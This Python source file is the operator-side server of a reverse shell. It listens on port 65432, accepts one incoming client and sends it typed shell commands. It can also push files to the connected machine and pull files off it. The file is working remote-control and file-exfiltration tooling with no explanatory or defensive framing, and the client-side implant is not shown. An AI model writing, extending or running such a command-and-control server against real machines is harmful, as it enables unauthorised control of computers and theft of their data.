import socket
import struct
import os

HOST = '0.0.0.0'
PORT = 65432
BUFFER_SIZE = 4096

def send_data(sock, data: bytes):
    """Send data preceded by its length (4 bytes, big endian)."""
    length = struct.pack('>I', len(data))
    sock.sendall(length + data)

def receive_data(sock):
    """Receive length-prefixed data."""
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(sock, length)

def recvall(sock, n):
    """Helper to receive n bytes or return None if EOF is hit."""
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[+] Listening on {HOST}:{PORT}...")

        client_socket, client_address = server_socket.accept()
        print(f"[+] Connected by {client_address}")

        with client_socket:
            while True:
                command = input("Shell > ").strip()
                if not command:
                    continue

                # Send command length-prefixed
                send_data(client_socket, command.encode('utf-8'))

                if command.lower() == 'exit':
                    print("[*] Exiting session.")
                    break

                if command.lower().startswith('upload '):
                    # upload local file to client
                    filename = command.split(maxsplit=1)[1]
                    if not os.path.isfile(filename):
                        print(f"[-] File not found: {filename}")
                        continue
                    with open(filename, 'rb') as f:
                        file_bytes = f.read()
                    print(f"[+] Sending file '{filename}' ({len(file_bytes)} bytes) to client...")
                    send_data(client_socket, file_bytes)

                    # Wait for client confirmation response
                    response = receive_data(client_socket)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No confirmation received.")

                elif command.lower().startswith('download '):
                    # request client to send file, then receive it
                    filename = command.split(maxsplit=1)[1]
                    print(f"[+] Waiting to receive file '{filename}' from client...")
                    file_bytes = receive_data(client_socket)
                    if file_bytes is None:
                        print("[-] Failed to receive file or connection closed.")
                        break
                    save_name = f"received_{os.path.basename(filename)}"
                    with open(save_name, 'wb') as f:
                        f.write(file_bytes)
                    print(f"[+] File received and saved as '{save_name}'")

                else:
                    # Receive normal command output
                    response = receive_data(client_socket)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No response received or connection closed.")

if __name__ == "__main__":
    start_server()
